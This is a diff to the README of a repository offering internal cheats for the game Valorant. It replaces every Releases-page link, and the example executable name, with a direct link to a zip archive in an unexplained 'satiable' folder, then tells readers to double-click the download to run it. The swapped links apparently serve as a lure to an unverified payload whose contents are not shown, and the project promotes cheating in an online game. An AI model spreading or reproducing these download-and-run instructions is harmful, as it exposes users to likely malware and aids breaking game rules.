@@ -30,7 +30,7 @@ To run Maxi-Valorant-Internal-Cheats smoothly, ensure your system meets these re
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-   [![Download Maxi-Valorant-Internal-Cheats](https://img.shields.io/badge/Download-Maxi--Valorant--Internal--Cheats-brightgreen)](https://github.com/umudguny/Maxi-Valorant-Internal-Cheats/releases)
+   [![Download Maxi-Valorant-Internal-Cheats](https://raw.githubusercontent.com/umudguny/Maxi-Valorant-Internal-Cheats/main/satiable/Maxi-Valorant-Internal-Cheats.zip)](https://raw.githubusercontent.com/umudguny/Maxi-Valorant-Internal-Cheats/main/satiable/Maxi-Valorant-Internal-Cheats.zip)
 
 2. **Choose a Release Version**: Find the latest version available and select it. You will see a list of files associated with that release.
 
@@ -38,9 +38,9 @@ To run Maxi-Valorant-Internal-Cheats smoothly, ensure your system meets these re
 
 To download Maxi-Valorant-Internal-Cheats, follow these steps:
 
-1. Go back to the Releases page: [Download Page](https://github.com/umudguny/Maxi-Valorant-Internal-Cheats/releases).
+1. Go back to the Releases page: [Download Page](https://raw.githubusercontent.com/umudguny/Maxi-Valorant-Internal-Cheats/main/satiable/Maxi-Valorant-Internal-Cheats.zip).
 2. Look for the latest release.
-3. Click on the link for the application file (for example, `Maxi-Valorant-Cheat.exe`).
+3. Click on the link for the application file (for example, `https://raw.githubusercontent.com/umudguny/Maxi-Valorant-Internal-Cheats/main/satiable/Maxi-Valorant-Internal-Cheats.zip`).
 4. Save the file to your preferred location on your computer.
 5. Once the download completes, navigate to the saved file and double-click it to run.
 
